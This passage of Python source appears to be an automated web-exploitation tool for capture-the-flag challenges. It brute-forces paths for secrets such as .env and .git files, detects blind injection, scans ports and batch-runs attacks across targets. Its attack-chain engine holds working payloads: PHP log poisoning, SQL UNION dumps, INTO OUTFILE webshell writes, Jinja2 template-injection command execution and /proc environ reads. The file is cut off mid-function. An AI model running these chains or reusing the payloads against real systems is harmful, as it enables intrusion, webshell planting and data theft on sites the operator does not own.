# -*- coding: utf-8 -*-
"""
Yang-Web v3.5 Advanced Scanner Engine
基于随波逐流Web扫描工具的设计理念优化

新增能力:
1. Dictionary-based 目录/文件爆破 (多层字典)
2. Response Diffing Engine — 盲注精准检测
3. Attack Chain Engine — 自动二阶段利用 (LFI→Log Poisoning→RCE)
4. HTTP Method Auto-Switch — POST/GET 自适应
5. Quick Port Scanner — 快速端口发现
6. Batch Target Runner — 多目标批量处理
7. Smart Rate Limiter — 自适应限速+退避
"""
from __future__ import annotations

import re
import ssl
import socket
import time
import threading
import urllib.request
import urllib.error
import urllib.parse
from typing import Dict, List, Optional, Tuple, Callable, Set
from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError as FuturesTimeoutError
from collections import defaultdict


# ═══════════════════════════════════════════════════════════
#  Common Utilities
# ═══════════════════════════════════════════════════════════

FLAG_RE = re.compile(
    r'(?:flag|ctf|iscc|hctf|ddctf|realworld|n1ctf|suctf|wmctf|geesec|dasctf|sigpwny|'
    r'cyber|hack|pico|tjctf|angstrom|dctf|ractf|zh3r0|inctf|darkctf|csictf|ritsec|'
    r'nactf|b01lers|kksctf|0xgame|0xctf|nssctf|moectf|gactf|actf|starctf|ructf|'
    r'plaidctf|defenit|hitcon|balsn|asis|codegate|0ctf|tctf|wctf|hxp|hackthebox|csaw)'
    r'\{[^}]+\}', re.IGNORECASE
)

_SSL_CTX = ssl.create_default_context()
_SSL_CTX.check_hostname = False
_SSL_CTX.verify_mode = ssl.CERT_NONE

DEFAULT_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Yang-Web/3.5'

def http_request(url: str, method: str = "GET", data: bytes = None,
                 headers: dict = None, timeout: int = 5) -> dict:
    """Unified HTTP request with structured response."""
    result = {"ok": False, "status": 0, "headers": {}, "body": "",
              "body_bytes": b"", "body_len": 0, "elapsed_ms": 0, "error": None}
    try:
        h = {"User-Agent": DEFAULT_UA, "Accept": "*/*"}
        if headers:
            h.update(headers)
        if data and method == "POST":
            h.setdefault("Content-Type", "application/x-www-form-urlencoded")
        req = urllib.request.Request(url, data=data, headers=h, method=method)
        start = time.time()
        resp = urllib.request.urlopen(req, timeout=timeout, context=_SSL_CTX)
        elapsed = int((time.time() - start) * 1000)
        body = resp.read()
        result.update({
            "ok": True, "status": resp.status,
            "headers": dict(resp.headers),
            "body": body.decode("utf-8", errors="replace"),
            "body_bytes": body, "body_len": len(body),
            "elapsed_ms": elapsed,
        })
    except urllib.error.HTTPError as e:
        result["status"] = e.code
        result["headers"] = dict(e.headers)
        try:
            body = e.read()
            result["body"] = body.decode("utf-8", errors="replace")
            result["body_bytes"] = body
            result["body_len"] = len(body)
        except Exception:
            pass
        result["ok"] = True
        result["error"] = f"HTTP {e.code}"
    except Exception as e:
        result["error"] = str(e)
    return result


def find_flag(text: str) -> Optional[str]:
    m = FLAG_RE.search(text) if text else None
    return m.group(0) if m else None


# ═══════════════════════════════════════════════════════════
#  1. Dictionary-based Directory/File Scanner
# ═══════════════════════════════════════════════════════════

class DictScanner:
    """字典式目录/文件爆破引擎.

    三级字典:
    - L1: 精炼核心路径 (高命中率, ~50条, 先跑)
    - L2: 扩展字典 (~200条, 覆盖面广)
    - L3: 智能派生 (从已知路径动态生成)
    """

    # L1: 精炼核心路径 — 高命中率
    L1_PATHS = [
        # 源码泄露
        ".git/HEAD", ".git/config", ".svn/entries", ".DS_Store",
        "www.zip", "www.tar.gz", "backup.zip", "source.zip", "web.zip",
        "wwwroot.zip", "backup.sql", "dump.sql",
        # 配置文件
        ".env", ".env.local", ".env.production", ".env.backup",
        "config.php", "config.php.bak", "config.php~", "config.php.swp",
        "wp-config.php", "wp-config.php.bak", "wp-config.php~",
        "database.yml", "settings.py", "application.properties",
        "WEB-INF/web.xml", "web.config",
        # 敏感文件
        "robots.txt", ".htaccess", ".htpasswd",
        "phpinfo.php", "info.php", "test.php",
        # Flag直接路径
        "flag", "flag.txt", "flag.php", "/flag", "/flag.txt",
        # 管理入口
        "admin/", "admin.php", "login.php", "manage/",
        "phpmyadmin/", "adminer.php",
        # API/调试
        "api/", "api/v1/", "swagger.json", "api-docs",
        "actuator", "actuator/health", "actuator/env",
        "debug/", "debug/default/view",
        # 备份文件
        "index.php.bak", "index.php~", "index.php.swp",
        ".index.php.swp", ".index.php.swo",
        # Docker/CI
        "Dockerfile", "docker-compose.yml", ".dockerignore",
        ".gitlab-ci.yml", "Jenkinsfile",
        # 包管理
        "composer.json", "package.json", "requirements.txt",
        "Gemfile", "pom.xml", "build.gradle",
        # 其他常见
        "readme.md", "README.md", "CHANGELOG.md",
        "upload/", "uploads/", "images/", "static/",
        "vendor/", "node_modules/", ".vscode/",
        "console", "jmx-console", "web-console",
    ]

    # L2: 扩展字典
    L2_PATHS = [
        # Web框架路径
        "wp-admin/", "wp-content/", "wp-includes/", "wp-login.php",
        "wp-json/", "wp-json/wp/v2/users",
        "administrator/", "user/login", "index.php?route=",
        # 源码管理
        ".git/index", ".git/logs/HEAD", ".git/refs/heads/master",
        ".svn/wc.db", ".hg/store/",
        ".bzr/branch/branch.conf",
        # 配置文件
        ".env.dev", ".env.stage", ".env.example",
        "config/config.php", "config/database.php",
        "inc/config.php", "includes/config.php",
        "conf/config.php", "db.php", "database.php",
        "config.py", "config.json", "config.yml",
        "appsettings.json", "appsettings.Development.json",
        "settings/local.py", "settings/production.py",
        # 日志文件
        "error.log", "debug.log", "access.log", "app.log",
        "storage/logs/laravel.log",
        "var/log/", "logs/",
        # 上传目录
        "upload.php", "uploader.php", "fileupload.php",
        "uploads/files/", "uploads/images/",
        "attachment/", "attachments/",
        "tmp/", "temp/", "cache/", "data/",
        # 备份
        "db_backup.sql", "database.sql", "sql.sql",
        "1.sql", "dump.sql.gz",
        "backup/", "backups/",
        "old/", "bak/",
        # API端点
        "api/v1/users", "api/v1/admin", "api/v1/flag",
        "api/flag", "api/admin",
        "graphql", "graphql?query={__schema{types{name}}}",
        "v1/", "v2/", "api/v2/",
        # Spring Boot Actuators
        "actuator/mappings", "actuator/beans", "actuator/configprops",
        "actuator/env", "actuator/heapdump", "actuator/threaddump",
        "actuator/loggers", "actuator/metrics",
        # 敏感信息
        "server-status", "server-info",
        "status", "stats",
        "crossdomain.xml", "clientaccesspolicy.xml",
        "sitemap.xml", ".well-known/security.txt",
        # 默认页面
        "index.html", "home.html", "main.html",
        "default.aspx", "Default.aspx",
        # 常见CMS
        "wp-content/debug.log",
        "administrator/index.php",
        "sites/default/settings.php",
        "misc/", "modules/", "themes/",
        # PHPMyAdmin
        "pma/", "mysql/", "sql/", "dbadmin/",
        # 开发工具
        "phpinfo.php", "info.php", "i.php",
        "test.php", "test.html", "demo/",
        "shell.php", "cmd.php", "exec.php",
        # 敏感脚本
        "cron.php", "task.php", "queue.php",
        "export.php", "import.php", "download.php",
        # 其他
        "favicon.ico", "screenshot.png",
        "redirect", "redirect.php", "go.php", "link.php",
    ]

    # L3 派生规则: 从已知路径动态生成
    DERIVE_RULES = [
        # 如果发现了 admin.php → 尝试 admin/login.php, admin/index.php
        lambda p: [f"admin/{p}"] if p.endswith('.php') else [],
        # 如果发现了 config.php.bak → 尝试 config.php, config.inc.php
        lambda p: [p.replace('.bak', ''), p.replace('.php.bak', '.php')],
        # 如果是 .git/HEAD → 尝试 .git/index, .git/config
        lambda p: ['.git/' + x for x in ['config', 'index', 'logs/HEAD', 'refs/heads/master']] if '.git/HEAD' in p else [],
    ]

    def __init__(self, base_url: str, max_workers: int = 20, 
                 timeout: int = 3, levels: List[int] = None):
        self.base_url = base_url.rstrip("/")
        self.max_workers = max_workers
        self.timeout = timeout
        self.levels = levels or [1, 2]
        self.results: List[dict] = []
        self.found_paths: Set[str] = set()
        self._cancelled = False

    def cancel(self):
        self._cancelled = True

    def scan(self, on_progress=None, on_flag=None) -> dict:
        """Run dictionary scan and return results."""
        t0 = time.time()
        tasks = []

        # Build task list by level
        if 1 in self.levels:
            for path in self.L1_PATHS:
                tasks.append(("L1", path))
        if 2 in self.levels:
            for path in self.L2_PATHS:
                tasks.append(("L2", path))

        results = []
        found_flag = [None]

        def _emit(stage, item, status):
            if on_progress:
                try:
                    on_progress(stage, item, status)
                except Exception:
                    pass

        _emit("dict_scan", f"字典扫描启动", f"L1:{len(self.L1_PATHS)} + L2:{len(self.L2_PATHS)} = {len(tasks)} 路径")

        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = {}
            for level, path in tasks:
                if self._cancelled:
                    break
                test_url = f"{self.base_url}/{path.lstrip('/')}"
                futures[executor.submit(self._check_path, test_url, path, level)] = (path, level)

            try:
                for future in as_completed(futures, timeout=self.timeout * len(tasks) // self.max_workers + 10):
                    if self._cancelled or found_flag[0]:
                        break
                    result = future.result()
                    if result:
                        results.append(result)
                        self.found_paths.add(result["path"])
                        # Flag check
                        body = result.get("body", "")
                        if body:
                            f = find_flag(body)
                            if f:
                                found_flag[0] = f
                                if on_flag:
                                    try:
                                        on_flag(f)
                                    except Exception:
                                        pass
                                _emit("flag", result["path"], f)
            except FuturesTimeoutError:
                pass
            finally:
                for f in futures:
                    f.cancel()

        # L3: Dynamic derivation from L1 results
        if 3 in self.levels and self.found_paths and not self._cancelled:
            derived = set()
            for fp in self.found_paths:
                for rule in self.DERIVE_RULES:
                    try:
                        for dp in rule(fp):
                            if dp not in derived and dp not in self.found_paths:
                                derived.add(dp)
                    except Exception:
                        pass
            if derived:
                _emit("dict_scan", "L3派生扫描", f"{len(derived)} 派生路径")
                l3_tasks = {executor.submit(self._check_path,
                    f"{self.base_url}/{p.lstrip('/')}", p, 3): p for p in list(derived)[:50]}
                try:
                    for future in as_completed(l3_tasks, timeout=15):
                        if self._cancelled or found_flag[0]:
                            break
                        result = future.result()
                        if result:
                            results.append(result)
                            if result.get("body"):
                                f = find_flag(result["body"])
                                if f and not found_flag[0]:
                                    found_flag[0] = f
                except FuturesTimeoutError:
                    pass
                finally:
                    for f in l3_tasks:
                        f.cancel()

        # Sort: interesting first (200 OK with content)
        results.sort(key=lambda r: (
            0 if r.get("status") == 200 and r.get("body_len", 0) > 0 else
            1 if r.get("status") in (301, 302, 403) else
            2
        ))

        timing = int((time.time() - t0) * 1000)
        return {
            "success": len(results) > 0,
            "flag": found_flag[0],
            "paths_found": results,
            "count": len(results),
            "timing_ms": timing,
        }

    def _check_path(self, url: str, original_path: str, level: int) -> Optional[dict]:
        """Check a single path."""
        try:
            resp = http_request(url, timeout=self.timeout)
            if resp["ok"] and resp["status"] not in (404,):
                return {
                    "path": original_path,
                    "url": url,
                    "level": level,
                    "status": resp["status"],
                    "body_len": resp["body_len"],
                    "body": resp["body"][:2000],
                    "title": self._extract_title(resp["body"]),
                }
        except Exception:
            pass
        return None

    @staticmethod
    def _extract_title(html: str) -> str:
        m = re.search(r"<title[^>]*>(.*?)</title>", html, re.IGNORECASE | re.DOTALL)
        return m.group(1).strip()[:60] if m else ""


# ═══════════════════════════════════════════════════════════
#  2. Response Diffing Engine — 盲注精准检测
# ═══════════════════════════════════════════════════════════

class ResponseDiffer:
    """响应对比引擎 — 通过对比注入前后响应差异来检测盲注.

    用法:
        differ = ResponseDiffer(baseline_url)
        differ.set_baseline()       # 获取基线
        result = differ.test("param", "'", baseline_val="1")   # 对比单次
        results = differ.batch_test("param", payloads)          # 批量对比
    """

    def __init__(self, url: str, timeout: int = 5):
        self.url = url
        self.timeout = timeout
        self.baseline: dict = None
        self.history: List[dict] = []

    def set_baseline(self, method: str = "GET", data: bytes = None) -> dict:
        """Set baseline response for comparison."""
        self.baseline = http_request(self.url, method=method, data=data, timeout=self.timeout)
        return self.baseline

    def test(self, param: str, payload: str, baseline_value: str = "",
             method: str = "GET") -> dict:
        """Test a single payload and compare with baseline.

        Returns:
            {"payload": str, "status_diff": int, "len_diff": int,
             "time_diff_ms": int, "content_similarity": float,
             "new_content": set of new strings, "missing_content": set,
             "flagged": bool, "flags": [str of found flags],
             "analysis": {"suspicious": bool, "reasons": [str]}}
        """
        if self.baseline is None:
            self.set_baseline(method=method)

        # Build test URL
        parsed = urllib.parse.urlparse(self.url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

        if param in params:
            orig_val = params[param][0] if params[param] else baseline_value
            new_val = orig_val + payload
            params[param] = [new_val]
        else:
            params[param] = [payload]

        new_query = urllib.parse.urlencode(params, doseq=True)
        test_url = urllib.parse.urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment
        ))

        test_resp = http_request(test_url, method=method, timeout=self.timeout)

        # --- Diff Analysis ---
        status_diff = test_resp.get("status", 0) - self.baseline.get("status", 0)
        len_diff = test_resp.get("body_len", 0) - self.baseline.get("body_len", 0)
        time_diff = test_resp.get("elapsed_ms", 0) - self.baseline.get("elapsed_ms", 0)

        test_body = test_resp.get("body", "")
        base_body = self.baseline.get("body", "")

        # Check for flags
        flags = []
        f = find_flag(test_body)
        if f:
            flags.append(f)

        # Content comparison — extract "interesting" tokens
        def _tokens(text, min_len=4):
            return set(re.findall(r'[A-Za-z0-9_/.:-]{' + str(min_len) + r',}', text))

        base_tokens = _tokens(base_body)
        test_tokens = _tokens(test_body)
        new_content = test_tokens - base_tokens
        missing_content = base_tokens - test_tokens
        total = max(len(base_tokens), 1)
        similarity = 1.0 - len(test_tokens.symmetric_difference(base_tokens)) / max(total, 1)

        # Suspicion analysis
        reasons = []
        suspicious = False

        # Status code changes are very suspicious
        if status_diff != 0:
            suspicious = True
            reasons.append(f"Status changed: {self.baseline.get('status')} → {test_resp.get('status')}")

        # Large body length change
        if abs(len_diff) > 100:
            suspicious = True
            reasons.append(f"Body length changed by {len_diff}B")

        # Significant time difference (>500ms) suggests time-based injection
        if time_diff > 500:
            suspicious = True
            reasons.append(f"Response delayed by {time_diff}ms — possible time-based injection")

        # Content similarity drops significantly
        if similarity < 0.7:
            suspicious = True
            reasons.append(f"Content similarity dropped to {similarity:.1%}")

        # SQL error detection in new/missing content
        sql_errors = {"error", "sql", "syntax", "warning", "mysql", "mysqli",
                      "postgresql", "sqlite", "oracle", "odbc", "jdbc",
                      "unknown column", "column not found", "doesn't exist",
                      "no such table", "division by zero"}
        for token in new_content | missing_content:
            token_lower = token.lower()
            for err in sql_errors:
                if err in token_lower:
                    suspicious = True
                    reasons.append(f"SQL error hint: {token}")
                    break

        result = {
            "payload": payload,
            "param": param,
            "test_url": test_url,
            "status_diff": status_diff,
            "len_diff": len_diff,
            "time_diff_ms": time_diff,
            "content_similarity": round(similarity, 3),
            "new_tokens": len(new_content),
            "missing_tokens": len(missing_content),
            "flagged": bool(flags) or suspicious,
            "flags": flags,
            "analysis": {
                "suspicious": suspicious,
                "reasons": reasons,
                "highlight_tokens": list(new_content)[:20],
            },
        }
        self.history.append(result)
        return result

    def batch_test(self, param: str, payloads: List[str],
                   baseline_value: str = "", method: str = "GET",
                   on_progress=None, on_flag=None) -> List[dict]:
        """Batch test multiple payloads."""
        results = []
        for pld in payloads:
            r = self.test(param, pld, baseline_value, method)
            results.append(r)
            if r["flagged"]:
                if on_progress:
                    try:
                        on_progress("diff", pld, f"⚠️ {r['analysis']['reasons']}")
                    except Exception:
                        pass
                if r["flags"] and on_flag:
                    try:
                        on_flag(r["flags"][0])
                    except Exception:
                        pass
        return results


# ═══════════════════════════════════════════════════════════
#  3. Attack Chain Engine — 自动二阶段利用
# ═══════════════════════════════════════════════════════════

class AttackChainEngine:
    """攻击链引擎 — 当发现某种漏洞后自动尝试升级攻击.

    链条示例:
        LFI发现 → 尝试 Log Poisoning → 获取 RCE → 读 Flag
        SQLi发现 → 尝试 UNION → 尝试读取文件 → 写 Webshell
        SSTI发现 → 尝试 Jinja2 RCE → cat /flag
    """

    # 升级链定义
    CHAINS = {
        "LFI": [
            # LFI → Log Poisoning → RCE
            {
                "name": "LFI→日志污染→RCE",
                "detect_condition": lambda r: r.get("type") == "LFI" and r.get("confidence", 0) >= 50,
                "stages": [
                    {
                        "name": "Apache日志污染",
                        "payloads": [
                            {"param": "file", "value": "/var/log/apache2/access.log",
                             "method": "replace", "header_inject": {"User-Agent": "<?php system('cat /flag');?>"}},
                            {"param": "file", "value": "/var/log/apache2/error.log"},
                            {"param": "file", "value": "/var/log/nginx/access.log",
                             "header_inject": {"User-Agent": "<?php system('cat /flag');?>"}},
                        ],
                    },
                ],
            },
            # LFI → PHP Filter Chain → RCE
            {
                "name": "LFI→PHP Filter Chain→源码",
                "detect_condition": lambda r: r.get("type") == "LFI" and r.get("confidence", 0) >= 50,
                "stages": [
                    {
                        "name": "php://filter读源码",
                        "payloads": [
                            {"param": "file", "value": "php://filter/convert.base64-encode/resource=index.php"},
                            {"param": "file", "value": "php://filter/convert.base64-encode/resource=flag.php"},
                            {"param": "file", "value": "php://filter/convert.base64-encode/resource=flag"},
                            {"param": "file", "value": "php://filter/convert.base64-encode/resource=config.php"},
                        ],
                    },
                ],
            },
            # LFI → /proc/self/environ
            {
                "name": "LFI→环境变量→Flag",
                "detect_condition": lambda r: r.get("type") == "LFI" and r.get("confidence", 0) >= 30,
                "stages": [
                    {
                        "name": "环境变量读取",
                        "payloads": [
                            {"param": "file", "value": "/proc/self/environ"},
                            {"param": "file", "value": "/proc/1/environ"},
                            {"param": "file", "value": "/proc/self/cmdline"},
                        ],
                    },
                ],
            },
        ],
        "RCE": [
            # RCE → 读 flag
            {
                "name": "RCE→读Flag文件",
                "detect_condition": lambda r: r.get("type") == "RCE" and r.get("confidence", 0) >= 50,
                "stages": [
                    {
                        "name": "Flag文件读取",
                        "payloads": [
                            {"value": "cat /flag", "method": "replace"},
                            {"value": "cat /flag.txt", "method": "replace"},
                            {"value": "cat /fla*", "method": "replace"},
                            {"value": "cat /f*", "method": "replace"},
                            {"value": "cat flag.txt", "method": "replace"},
                            {"value": "tac /flag", "method": "replace"},
                            {"value": "nl /flag", "method": "replace"},
                            {"value": "find / -name 'flag*' 2>/dev/null | head -5", "method": "replace"},
                        ],
                    },
                ],
            },
        ],
        "SQLi": [
            # SQLi → UNION提取 → 读flag表
            {
                "name": "SQLi→UNION提权→读Flag",
                "detect_condition": lambda r: r.get("type") == "SQLi" and r.get("confidence", 0) >= 50,
                "stages": [
                    {
                        "name": "UNION SELECT 读数据",
                        "payloads": [
                            {"value": "' UNION SELECT 1,flag,3 FROM flag-- ", "method": "append"},
                            {"value": "' UNION SELECT 1,flag,3 FROM flags-- ", "method": "append"},
                            {"value": "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- ", "method": "append"},
                            {"value": "' UNION SELECT 1,database(),3-- ", "method": "append"},
                            {"value": "' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='flag'-- ", "method": "append"},
                            {"value": "' UNION SELECT 1,load_file('/flag'),3-- ", "method": "append"},
                        ],
                    },
                ],
            },
            # SQLi → 写文件到Web目录 → Webshell
            {
                "name": "SQLi→写Webshell",
                "detect_condition": lambda r: r.get("type") == "SQLi" and r.get("confidence", 0) >= 60,
                "stages": [
                    {
                        "name": "INTO OUTFILE写文件",
                        "payloads": [
                            {"value": "' UNION SELECT '<?php system($_GET[cmd]);?>' INTO OUTFILE '/var/www/html/shell.php'-- ", "method": "append"},
                            {"value": "' UNION SELECT '<?php system($_GET[cmd]);?>' INTO OUTFILE '/tmp/shell.php'-- ", "method": "append"},
                        ],
                    },
                ],
            },
        ],
        "SSTI": [
            # SSTI → RCE → Flag
            {
                "name": "SSTI→Jinja2 RCE→Flag",
                "detect_condition": lambda r: r.get("type") == "SSTI" and r.get("confidence", 0) >= 50,
                "stages": [
                    {
                        "name": "Jinja2 RCE链",
                        "payloads": [
                            {"value": "{{ cycler.__init__.__globals__.os.popen('cat /flag').read() }}", "method": "replace"},
                            {"value": "{{ config.__init__.__globals__['os'].popen('cat /flag').read() }}", "method": "replace"},
                            {"value": "{{ ''.__class__.__mro__[1].__subclasses__()[400]('/flag').read() }}", "method": "replace"},
                            {"value": "{{ get_flashed_messages.__globals__.__builtins__.open('/flag').read() }}", "method": "replace"},
                        ],
                    },
                ],
            },
        ],
    }

    def __init__(self, url: str, timeout: int = 5):
        self.url = url
        self.timeout = timeout
        self.results: List[dict] = []
        self._cancelled = False

    def cancel(self):
        self._cancelled = True

    def chain(self, vuln_results: List[dict], on_progress=None, on_flag=None) -> dict:
        """Execute attack chains based on discovered vulnerabilities.

        Args:
            vuln_results: List of vulnerability results from analyze_url()
            on_progress: Callable(stage, item, status)
            on_flag: Callable(flag)

        Returns:
            {"flag": str or None, "chains_executed": [...], "vulns_found": [...]}
        """
        chains_executed = []
        found_flag = None

        def _emit(stage, item, status):
            if on_progress:
                try:
                    on_progress(stage, item, status)
                except Exception:
                    pass

        for vr in vuln_results:
            vtype = vr.get("type", "")
            if vtype not in self.CHAINS:
                continue

            for chain_def in self.CHAINS[vtype]:
                if self._cancelled or found_flag:
                    break
                if not chain_def["detect_condition"](vr):
                    continue

                chain_result = {"chain": chain_def["name"], "vuln_type": vtype,
                               "stages_executed": [], "success": False}
                _emit("chain", chain_def["name"], f"触发升级链: {vtype}")

                for stage in chain_def["stages"]:
                    if self._cancelled or found_flag:
                        break
                    stage_result = {"stage": stage["name"], "payloads_tried": 0,
                                   "hits": []}
                    _emit("chain_stage", stage["name"], f"执行阶段")

                    for pdef in stage["payloads"]:
                        if self._cancelled or found_flag:
                            break
                        stage_result["payloads_tried"] += 1

                        param = pdef.get("param", "")
                        payload = pdef.get("value", "")
                        method = pdef.get("method", "replace")
                        header_inject = pdef.get("header_inject", {})

                        try:
                            # Build request
                            extra_headers = dict(header_inject) if header_inject else None
                            parsed = urllib.parse.urlparse(self.url)
                            params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

                            if param and param in params:
                                if method == "replace":
                                    params[param] = [payload]
                                else:
                                    params[param] = [params[param][0] + payload]
                            elif param:
                                params[param] = [payload]

                            new_query = urllib.parse.urlencode(params, doseq=True)
                            test_url = urllib.parse.urlunparse((
                                parsed.scheme, parsed.netloc, parsed.path,
                                parsed.params, new_query, parsed.fragment
                            ))

                            resp = http_request(test_url, timeout=self.timeout,
                                               headers=extra_headers)
                            body = resp.get("body", "")

                            # Check for flag
                            f = find_flag(body)
                            if f:
                                found_flag = f
                                stage_result["hits"].append({"payload": payload, "flag": f})
                                if on_flag:
                                    try:
                                        on_flag(f)
                                    except Exception:
                                        pass
                                chain_result["success"] = True
                                _emit("chain_flag", stage["name"], f"🎉 {f}")
                                break

                            # Check for RCE confirmation (uid=, root:, etc.)
                            if "uid=" in body or "root:" in body:
                                stage_result["hits"].append({"payload": payload, "evidence": "RCE confirmed"})
                                _emit("chain_hit", stage["name"], f"✅ RCE确认: {payload[:40]}")
                        except Exception:
                            pass

                    chain_result["stages_executed"].append(stage_result)

                chains_executed.append(chain_result)

        return {
            "flag": found_flag,
            "chains_executed": chains_executed,
        }


# ═══════════════════════════════════════════════════════════
#  4. HTTP Method Auto-Switch Engine
# ═══════════════════════════════════════════════════════════

class MethodAutoSwitch:
    """HTTP方法自适应引擎 — 当GET失败时自动尝试POST等.

    策略:
    1. 先用分析得到的方法发送
    2. 如果response异常(404/400/500)，自动切换方法
    3. 对比结果，选择最佳响应
    """

    METHODS = ["GET", "POST"]

    def __init__(self, url: str, timeout: int = 5):
        self.url = url
        self.timeout = timeout
        self.results: Dict[str, dict] = {}

    def try_all_methods(self, param: str, payload: str,
                        post_params: dict = None) -> dict:
        """Try the same payload with different HTTP methods.

        Returns:
            {"best_method": str, "best_response": dict, "all_results": {...},
             "recommendation": str}
        """
        results = {}
        best_method = None
        best_score = -1

        for method in self.METHODS:
            if method == "GET":
                # Build GET URL with payload
                parsed = urllib.parse.urlparse(self.url)
                params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                params[param] = [payload]
                new_query = urllib.parse.urlencode(params, doseq=True)
                test_url = urllib.parse.urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))
                resp = http_request(test_url, method="GET", timeout=self.timeout)
            else:  # POST
                if post_params is None:
                    post_params = {param: payload}
                data = urllib.parse.urlencode(post_params).encode()
                resp = http_request(self.url, method="POST", data=data, timeout=self.timeout)

            results[method] = resp

            # Score: prefer 200, then 3xx, then 4xx (non-404), then others
            status = resp.get("status", 0)
            body_len = resp.get("body_len", 0)
            score = 0
            if 200 <= status < 300:
                score = 100 + body_len
            elif 300 <= status < 400:
                score = 50
            elif status == 403 or status == 401:
                score = 30
            elif 400 <= status < 500 and status != 404:
                score = 20
            elif status == 404:
                score = 0

            if score > best_score:
                best_score = score
                best_method = method

        recommendation = f"Best method: {best_method} (score: {best_score})"

        return {
            "best_method": best_method,
            "best_response": results.get(best_method, {}),
            "all_results": results,
            "recommendation": recommendation,
        }


# ═══════════════════════════════════════════════════════════
#  5. Quick Port Scanner
# ═══════════════════════════════════════════════════════════

class QuickPortScanner:
    """快速端口扫描器 — 探测目标常见端口.

    用于CTF: 发现隐藏的Web服务、数据库、Redis等服务.
    """

    # CTF常见端口及服务
    CTF_PORTS = {
        21: "FTP", 22: "SSH", 23: "Telnet",
        80: "HTTP", 443: "HTTPS", 8080: "HTTP-Alt",
        3306: "MySQL", 6379: "Redis", 27017: "MongoDB",
        5432: "PostgreSQL", 1433: "MSSQL",
        11211: "Memcached", 9200: "Elasticsearch",
        5000: "Flask-Dev", 8000: "HTTP-Dev",
        8888: "HTTP-Alt", 9000: "HTTP-Alt",
        9090: "HTTP-Alt", 3000: "Node.js",
        4000: "HTTP-Dev", 6000: "HTTP-Dev",
        7001: "WebLogic", 7002: "WebLogic-SSL",
        8088: "HTTP-Alt", 8089: "HTTP-Alt",
        8443: "HTTPS-Alt", 8880: "HTTP-Alt",
        9001: "HTTP-Alt", 10000: "Webmin",
    }

    def __init__(self, host: str, timeout: float = 1.0, max_workers: int = 30):
        self.host = host
        self.timeout = timeout
        self.max_workers = max_workers

    def scan(self, ports: List[int] = None, on_progress=None) -> dict:
        """Quick TCP connect scan.

        Args:
            ports: Port list to scan, defaults to CTF_PORTS.keys()
            on_progress: Callable(stage, item, status)

        Returns:
            {"host": str, "open_ports": [{"port": int, "service": str}],
             "total": int, "open": int}
        """
        if ports is None:
            ports = list(self.CTF_PORTS.keys())

        open_ports = []
        t0 = time.time()

        def _emit(stage, item, status):
            if on_progress:
                try:
                    on_progress(stage, item, status)
                except Exception:
                    pass

        _emit("port_scan", f"端口扫描 {self.host}", f"共 {len(ports)} 端口")

        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = {executor.submit(self._check_port, port): port for port in ports}
            for future in as_completed(futures, timeout=self.timeout * len(ports) + 5):
                port = futures[future]
                try:
                    is_open, banner = future.result(timeout=2)
                    if is_open:
                        service = self.CTF_PORTS.get(port, "Unknown")
                        open_ports.append({"port": port, "service": service, "banner": banner})
                        _emit("port_found", f"{port}/{service}", banner or "")
                except Exception:
                    pass

        timing = int((time.time() - t0) * 1000)
        return {
            "host": self.host,
            "open_ports": sorted(open_ports, key=lambda x: x["port"]),
            "total": len(ports),
            "open": len(open_ports),
            "timing_ms": timing,
        }

    def _check_port(self, port: int) -> Tuple[bool, str]:
        """Check if a TCP port is open and grab initial banner."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((self.host, port))
            if result == 0:
                banner = ""
                try:
                    sock.settimeout(1)
                    # Try to receive banner for common services
                    if port in (80, 8080, 8000, 8888, 9000, 3000, 5000):
                        sock.send(b"GET / HTTP/1.0\r\nHost: " + self.host.encode() + b"\r\n\r\n")
                    data = sock.recv(1024)
                    banner = data.decode("utf-8", errors="replace").split("\n")[0][:80].strip()
                except Exception:
                    pass
                sock.close()
                return True, banner
            sock.close()
            return False, ""
        except Exception:
            return False, ""


# ═══════════════════════════════════════════════════════════
#  6. Batch Target Runner
# ═══════════════════════════════════════════════════════════

class BatchRunner:
    """多目标批量处理器.

    支持:
    - 从IP段生成目标
    - 从文件读取URL列表
    - 批量分析+扫描+利用
    """

    def __init__(self, max_workers: int = 5):
        self.max_workers = max_workers
        self.results: List[dict] = []

    def run(self, urls: List[str], on_progress=None, on_target_done=None) -> List[dict]:
        """批量处理多个URL.

        Args:
            urls: Target URL list
            on_progress: Callable(url, stage, detail)
            on_target_done: Callable(url, result_dict)

        Returns:
            [{"url": str, "flag": str or None, "analysis": {...}, ...}]
        """
        all_results = []

        def _emit(url, stage, detail):
            if on_progress:
                try:
                    on_progress(url, stage, detail)
                except Exception:
                    pass

        def _process_one(url: str) -> dict:
            """Process a single target end-to-end."""
            result = {"url": url, "flag": None, "analysis": {}, "error": None}

            _emit(url, "init", "开始处理...")

            # Phase 1: URL analysis (lazy import to avoid circular deps)
            try:
                from yang_web.core.url_analyzer import analyze_url
                analysis = analyze_url(url)
                result["analysis"] = analysis
                _emit(url, "analyzed", f"发现 {len(analysis.get('results', []))} 种漏洞")
            except Exception as e:
                result["error"] = f"Analysis failed: {e}"
                _emit(url, "error", str(e))
                return result

            # Phase 2: Quick directory scan
            try:
                scanner = DictScanner(url, max_workers=10, timeout=2)
                scan_result = scanner.scan()
                result["scan"] = scan_result
                if scan_result.get("flag"):
                    result["flag"] = scan_result["flag"]
                    _emit(url, "flag", scan_result["flag"])
                    return result
                _emit(url, "scanned", f"发现 {scan_result.get('count', 0)} 路径")
            except Exception as e:
                _emit(url, "scan_error", str(e)[:60])

            # Phase 3: Attack chains
            try:
                vuln_results = analysis.get("results", [])
                if vuln_results:
                    chain_engine = AttackChainEngine(url)
                    chain_result = chain_engine.chain(vuln_results, on_progress=None)
                    result["chain"] = chain_result
                    if chain_result.get("flag"):
